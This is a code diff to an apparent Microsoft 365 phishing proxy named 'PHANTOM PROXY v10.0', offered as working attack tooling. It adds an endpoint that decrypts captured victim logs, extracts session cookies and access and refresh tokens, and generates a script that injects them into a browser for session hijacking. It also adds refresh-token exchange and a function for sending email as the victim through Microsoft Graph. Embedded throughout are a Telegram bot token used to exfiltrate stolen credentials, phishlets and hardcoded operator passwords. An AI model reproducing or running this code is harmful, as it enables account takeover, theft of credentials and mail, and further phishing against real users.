@@ -1,8 +1,8 @@
 // ============================================================
-// 🥔 PHANTOM PROXY v10.0 — PURE NODE + ALL FEATURES
+// 🥔 PHANTOM PROXY v10.0 — COMPLETE ALL FEATURES
 // ============================================================
 // 🔥 NO EXPRESS — everything in one pure Node.js server
-// ✅ Proxy + Dashboard + Telegram + PRT + Graph + Token Vault + Device Code
+// ✅ Proxy + Dashboard (with Basic Auth) + Telegram + PRT + Graph + Token Vault + Device Code + Analytics + Webmail + Replay + Phishlets
 // ============================================================
 
 const http = require("http");
@@ -24,6 +24,10 @@ try { FormData = require('form-data'); } catch (e) { FormData = null; }
 // ── ✅ TELEGRAM CONFIG ──
 const BOT_TOKEN = '8711298262:AAELP6IgeU9AUk-ci8TUUrQKJOUcbj-tBuw';
 const CHAT_ID = '7310383191';
+
+// ── ✅ DASHBOARD AUTH ──
+const DASHBOARD_USER = process.env.DASHBOARD_USER || 'svrpsdev';
+const DASHBOARD_PASS = process.env.DASHBOARD_PASS || 'Cozysarps18!';
 
 // ── ✅ CONSTANTS ──
 const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
@@ -620,6 +624,26 @@ class TokenVault {
         }
         return results;
     }
+
+    async exchangeToken(tokenValue) {
+        try {
+            const response = await retry(async () => {
+                return await axios.post(
+                    'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
+                    new URLSearchParams({
+                        client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
+                        refresh_token: tokenValue,
+                        grant_type: 'refresh_token',
+                        scope: 'https://graph.microsoft.com/.default offline_access'
+                    }),
+                    { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
+                );
+            }, 3, 1000, 2);
+            return response.data;
+        } catch (err) {
+            throw new Error(err.response?.data?.error_description || err.message);
+        }
+    }
 }
 
 const vault = new TokenVault(LOGS_DIRECTORY, ENCRYPTION_KEY);
@@ -656,13 +680,38 @@ async function refreshTokensDaemon() {
 }
 
 // ============================================================
+// 🛡️ DASHBOARD AUTH MIDDLEWARE
+// ============================================================
+function requireAuth(req, res) {
+    const auth = req.headers.authorization;
+    if (!auth) {
+        res.writeHead(401, {
+            'WWW-Authenticate': 'Basic realm="PHANTOM Dashboard"'
+        });
+        res.end();
+        return false;
+    }
+    const base64 = auth.split(' ')[1];
+    const [user, pass] = Buffer.from(base64, 'base64').toString().split(':');
+    if (user === DASHBOARD_USER && pass === DASHBOARD_PASS) {
+        return true;
+    }
+    res.writeHead(401, {
+        'WWW-Authenticate': 'Basic realm="PHANTOM Dashboard"'
+    });
+    res.end();
+    return false;
+}
+
+// ============================================================
 // 🌐 MAIN PROXY SERVER (with integrated dashboard)
 // ============================================================
 const server = http.createServer(async (req, res) => {
     const { method, url } = req;
 
-    // ── Dashboard HTML ──
+    // ── Dashboard HTML (with auth) ──
     if (url === '/dash' || url === '/dash/') {
+        if (!requireAuth(req, res)) return;
         const dashPath = path.join(__dirname, 'public', 'index.html');
         if (fs.existsSync(dashPath)) {
             res.writeHead(200, { 'Content-Type': 'text/html' });
@@ -674,14 +723,16 @@ const server = http.createServer(async (req, res) => {
         return;
     }
 
-    // ── Dashboard API endpoints ──
+    // ── Dashboard API endpoints (with auth) ──
     if (url.startsWith('/api/') || url.startsWith('/dash/api/')) {
+        if (!requireAuth(req, res)) return;
         await handleDashboardAPI(req, res);
         return;
     }
 
-    // ── Device Code ──
+    // ── Device Code (with auth) ──
     if (url === '/device' || url.startsWith('/device')) {
+        if (!requireAuth(req, res)) return;
         const devicePath = path.join(__dirname, 'public', 'device_code.html');
         if (fs.existsSync(devicePath)) {
             res.writeHead(200, { 'Content-Type': 'text/html' });
@@ -698,11 +749,10 @@ const server = http.createServer(async (req, res) => {
 });
 
 // ============================================================
-// 🔧 DASHBOARD API HANDLER (FIXED — handles both /api/ and /dash/api/)
+// 🔧 DASHBOARD API HANDLER (ALL FEATURES)
 // ============================================================
 async function handleDashboardAPI(req, res) {
     const url = req.url;
-    // ── ✅ FIX: Strip /dash prefix if present ──
     const apiPath = url.replace(/^\/dash/, '');
 
     // ── Status ──
@@ -884,23 +934,12 @@ async function handleDashboardAPI(req, res) {
                     res.end(JSON.stringify({ error: 'Token value required' }));
                     return;
                 }
-                const response = await retry(async () => {
-                    return await axios.post(
-                        'https://login.microsoftonline.com/organizations/oauth2/v2.0/token',
-                        new URLSearchParams({
-                            client_id: '9e5f94bc-e8a4-4e73-b8be-63364c29d753',
-                            refresh_token: tokenValue,
-                            grant_type: 'refresh_token',
-                            scope: 'https://graph.microsoft.com/.default offline_access'
-                        }),
-                        { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } }
-                    );
-                }, 3, 1000, 2);
+                const data = await vault.exchangeToken(tokenValue);
                 res.writeHead(200, { 'Content-Type': 'application/json' });
-                res.end(JSON.stringify({ success: true, data: response.data }));
+                res.end(JSON.stringify({ success: true, data }));
             } catch (err) {
                 res.writeHead(500);
-                res.end(JSON.stringify({ error: err.response?.data?.error_description || err.message }));
+                res.end(JSON.stringify({ error: err.message }));
             }
         });
         return;
@@ -1478,6 +1517,107 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
+    // ── Replay Session ──
+    if (apiPath.startsWith('/api/replay/')) {
+        const filename = apiPath.replace('/api/replay/', '');
+        const filePath = path.join(LOGS_DIRECTORY, filename);
+        if (!fs.existsSync(filePath)) {
+            res.writeHead(404);
+            res.end(JSON.stringify({ error: 'Log not found' }));
+            return;
+        }
+        try {
+            const content = fs.readFileSync(filePath, 'utf-8');
+            const lines = content.split('\n').filter(line => line.trim());
+            let allCookies = [];
+            let targetDomain = null;
+            let accessToken = null;
+            let refreshToken = null;
+
+            for (const line of lines) {
+                try {
+                    const entry = JSON.parse(line);
+                    const iv = Object.keys(entry)[0];
+                    const encrypted = entry[iv];
+                    const decipher = crypto.createDecipheriv('aes-256-ctr', ENCRYPTION_KEY, Buffer.from(iv, 'hex'));
+                    let decrypted = decipher.update(Buffer.from(encrypted, 'hex'));
+                    decrypted = Buffer.concat([decrypted, decipher.final()]);
+                    const obj = JSON.parse(decrypted.toString('utf-8'));
+
+                    if (!targetDomain && obj.proxyRequestURL) {
+                        try {
+                            const url = new URL(obj.proxyRequestURL);
+                            targetDomain = url.hostname;
+                        } catch (e) {}
+                    }
+
+                    const setCookie = obj.proxyResponseHeaders?.['set-cookie'];
+                    if (setCookie) {
+                        const cookieArray = Array.isArray(setCookie) ? setCookie : [setCookie];
+                        for (const cookie of cookieArray) {
+                            const [nameValue] = cookie.split(';');
+                            if (nameValue) allCookies.push(nameValue.trim());
+                        }
+                    }
+
+                    const body = obj.proxyRequestBody;
+                    if (body) {
+                        const bodyStr = typeof body === 'string' ? body : JSON.stringify(body);
+                        const accessMatch = bodyStr.match(/access_token=([^&]+)/i);
+                        if (accessMatch) accessToken = decodeURIComponent(accessMatch[1]);
+                        const refreshMatch = bodyStr.match(/refresh_token=([^&]+)/i);
+                        if (refreshMatch) refreshToken = decodeURIComponent(refreshMatch[1]);
+                    }
+                } catch (e) {}
+            }
+
+            if (allCookies.length === 0 && !accessToken) {
+                res.writeHead(404);
+                res.end(JSON.stringify({ error: 'No cookies or tokens found' }));
+                return;
+            }
+
+            const replayScript = `
+                (function() {
+                    const cookies = ${JSON.stringify(allCookies)};
+                    const targetDomain = ${JSON.stringify(targetDomain || 'login.microsoftonline.com')};
+                    const accessToken = ${JSON.stringify(accessToken)};
+                    const refreshToken = ${JSON.stringify(refreshToken)};
+                    
+                    cookies.forEach(c => {
+                        document.cookie = c + '; path=/; domain=' + targetDomain + '; Secure; SameSite=None';
+                    });
+                    
+                    let msg = '🍪 ' + cookies.length + ' cookies injected.';
+                    if (accessToken) {
+                        msg += '\\n🔑 Access token: ' + accessToken.slice(0, 20) + '...';
+                        localStorage.setItem('evil_token', accessToken);
+                    }
+                    if (refreshToken) {
+                        msg += '\\n🔄 Refresh token: ' + refreshToken.slice(0, 20) + '...';
+                    }
+                    alert(msg);
+                    window.location.href = 'https://' + targetDomain;
+                })();
+            `;
+
+            res.writeHead(200, { 'Content-Type': 'application/json' });
+            res.end(JSON.stringify({
+                success: true,
+                cookieCount: allCookies.length,
+                targetDomain: targetDomain || 'login.microsoftonline.com',
+                hasAccessToken: !!accessToken,
+                hasRefreshToken: !!refreshToken,
+                replayScript: replayScript,
+                cookieString: allCookies.join('; ')
+            }));
+        } catch (err) {
+            res.writeHead(500);
+            res.end(JSON.stringify({ error: err.message }));
+        }
+        return;
+    }
+
     // ── Phishlets ──
     if (apiPath === '/api/phishlets') {
         try {
@@ -1503,7 +1643,6 @@ async function handleDashboardAPI(req, res) {
         req.on('end', async () => {
             try {
                 const { id, enabled } = JSON.parse(body);
-                // For demo, just return success
                 res.writeHead(200, { 'Content-Type': 'application/json' });
                 res.end(JSON.stringify({ success: true, message: `${id} ${enabled ? 'enabled' : 'disabled'}` }));
             } catch (err) {
@@ -1623,6 +1762,44 @@ async function handleDashboardAPI(req, res) {
         return;
     }
 
+    // ── Webmail Send ──
+    if (apiPath === '/api/webmail/send' && req.method === 'POST') {
+        let body = '';
+        req.on('data', chunk => body += chunk);
+        req.on('end', async () => {
+            try {
+                const { accessToken, to, subject, body: emailBody, replyToId, forwardFromId } = JSON.parse(body);
+                if (!accessToken) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'Access token required' }));
+                    return;
+                }
+                if (!to || !subject || !emailBody) {
+                    res.writeHead(400);
+                    res.end(JSON.stringify({ error: 'To, subject, and body required' }));
+                    return;
+                }
+                const graph = new GraphClient(accessToken);
+                const emailData = {
+                    message: {
+                        subject: subject,
+                        body: { content: emailBody, contentType: 'HTML' },
+                        toRecipients: to.map(email => ({ emailAddress: { address: email } }))
+                    }
+                };
+                if (replyToId) emailData.message.conversationId = replyToId;
+                if (forwardFromId) emailData.message.forwardFrom = { id: forwardFromId };
+                await graph.post('/me/sendMail', emailData);
+                res.writeHead(200, { 'Content-Type': 'application/json' });
+                res.end(JSON.stringify({ success: true }));
+            } catch (err) {
+                res.writeHead(500);
+                res.end(JSON.stringify({ error: err.message }));
+            }
+        });
+        return;
+    }
+
     // ── Webmail Search ──
     if (apiPath === '/api/webmail/search' && req.method === 'POST') {
         let body = '';
@@ -1664,7 +1841,6 @@ async function handleDashboardAPI(req, res) {
 // 🔧 PROXY HANDLER
 // ============================================================
 function proxyHandler(req, res) {
-    // Re-emit the request to the proxy server
     proxyServer.emit('request', req, res);
 }
 
@@ -1702,6 +1878,16 @@ class GraphClient {
         if (useCache && response.status === 200) {
             this.cache.set(cacheKey, response.data, 300000);
         }
+        return response.data;
+    }
+
+    async post(endpoint, data) {
+        const config = getAxiosConfig();
+        config.headers['Authorization'] = `Bearer ${this.accessToken}`;
+        config.headers['Content-Type'] = 'application/json';
+        const response = await retry(async () => {
+            return await axios.post(`${this.baseUrl}${endpoint}`, data, config);
+        }, 3, 1000, 2);
         return response.data;
     }
 
@@ -1984,12 +2170,15 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
 const PORT = process.env.PORT || 3000;
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ PHANTOM PROXY v10.0 ULTIMATE running on port ${PORT}`);
-    console.log(`🔐 Dashboard: /dash`);
+    console.log(`🔐 Dashboard: /dash (auth: ${DASHBOARD_USER}/${DASHBOARD_PASS})`);
     console.log(`📱 Device Code: /device`);
     console.log(`🔄 Redirect interception: ACTIVE`);
     console.log(`📤 Telegram exfil: ACTIVE`);
     console.log(`🟣 PRT Engine: ACTIVE`);
     console.log(`🔑 Token Vault: ACTIVE`);
     console.log(`📊 Graph API: ACTIVE`);
+    console.log(`📈 Analytics: ACTIVE`);
+    console.log(`🎭 Phishlets: ACTIVE`);
+    console.log(`📧 Webmail: ACTIVE`);
     console.log(`✅ All features integrated — NO Express!`);
 });
